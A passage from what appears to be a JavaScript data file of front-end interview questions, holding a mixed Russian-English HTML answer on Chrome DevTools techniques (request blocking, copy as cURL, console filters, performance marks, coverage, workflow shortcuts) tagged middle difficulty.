console.logs</li></ul><p><strong>Search and replace:</strong></p><p><strong>Search across files:</strong></p><ul><li>⌘⇧F / Ctrl+Shift+F</li><li>Regex support</li><li>Case sensitive toggle</li><li>Search в Sources или Network</li></ul><p><strong>Replace:</strong></p><ul><li>⌘⌥F / Ctrl+H в editor</li><li>Bulk replace all</li></ul><p><strong>Network request blocking patterns:</strong></p><ul><li>Network → right-click → Block request URL</li><li>Patterns: *analytics*, *.jpg, specific domains</li><li>Testing без dependencies</li></ul><p><strong>Practical use:</strong></p><ul><li>\"Как сайт без analytics?\"</li><li>Block *analytics*</li><li>Reload → clean version</li></ul><p><strong>Copy as fetch/cURL:</strong></p><ul><li>Network → right-click request</li><li>Copy as fetch — JavaScript code</li><li>Copy as cURL — terminal command</li></ul><p><strong>Использую для:</strong></p><ul><li>Репродукция API calls</li><li>Sharing с backend team</li><li>Testing в isolation</li></ul><p><strong>$_ в Console:</strong></p><ul><li>Reference к последнему evaluated expression</li><li>> 2 + 2</li><li>4</li><li>> $_ * 2</li><li>8</li></ul><p><strong>Полезно для:</strong></p><ul><li>Chain calculations</li><li>Work с last result</li></ul><p><strong>Preserve log между navigations:</strong></p><ul><li>Console/Network → \"Preserve log\" checkbox</li><li>Логи не очищаются при reload/navigation</li><li>Critical для debugging redirects</li></ul><p><strong>Filter expressions:</strong></p><p><strong>Console advanced filtering:</strong></p><ul><li>-xyz — exclude содержащие xyz</li><li>url:api — только с api в URL</li><li>method:POST — только POST requests</li><li>status-code:404 — specific status</li></ul><p><strong>Regex в filters:</strong></p><ul><li>/^GET/ — начинается с GET</li><li>/\\.js$/ — заканчивается .js</li></ul><p><strong>Custom device profiles:</strong></p><ul><li>Settings → Devices → Add custom device</li><li>Свои presets для testing</li><li>Company-specific devices</li></ul><p><strong>Performance marks в code:</strong></p><ul><li>performance.mark('start-render');</li><li>// ... код</li><li>performance.mark('end-render');</li><li>performance.measure('render', 'start-render', 'end-render');</li><li>// Видно в Performance timeline</li></ul><p><strong>CSS/JS coverage во время interaction:</strong></p><ul><li>Start coverage</li><li>Не reload сразу</li><li>Perform user flow</li><li>Stop coverage</li><li>Видно really используемый код</li></ul><p><strong>Experiments (Settings → Experiments):</strong></p><ul><li>Beta features</li><li>Full accessibility tree</li><li>CSS Overview</li><li>Timeline as console.profile()</li></ul><p><strong>Мои enabled experiments:</strong></p><ul><li>Full accessibility tree view</li><li>Protocol Monitor</li><li>WASMH Dwarf support</li></ul><p><strong>Multi-screen debugging:</strong></p><ul><li>Separate DevTools window</li><li>Один экран — app</li><li>Другой — DevTools</li><li>⌘⇧D / Ctrl+Shift+D — undock</li></ul><p><strong>Workflow efficiency tips:</strong></p><ul><li>✅ Learn keyboard shortcuts</li><li>✅ Customize через Settings</li><li>✅ Create snippets для repetitive tasks</li><li>✅ Use Command Menu активно</li><li>✅ Preserve log by default</li><li>✅ Setup Workspaces для projects</li><li>✅ Blackbox third-party code</li></ul><p><strong>Time-saving combinations:</strong></p><ul><li>Command Menu + fuzzy search = не нужно помнить где что</li><li>Element picker + $0 = instant manipulation</li><li>Snippets + shortcuts = reusable tools</li><li>Workspaces + auto-save = seamless editing</li></ul><p><strong>Мой типичный debugging workflow:</strong></p><ol><li>⌘⇧C — pick element</li><li>Inspect styles в Elements</li><li>$0 в Console — manipulation</li><li>Network для API calls</li><li>Performance если медленно</li><li>Changes panel → copy modifications</li></ol>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'shortcuts', 'продвинутые техники', 'workflow', 'efficiency']
  },

];
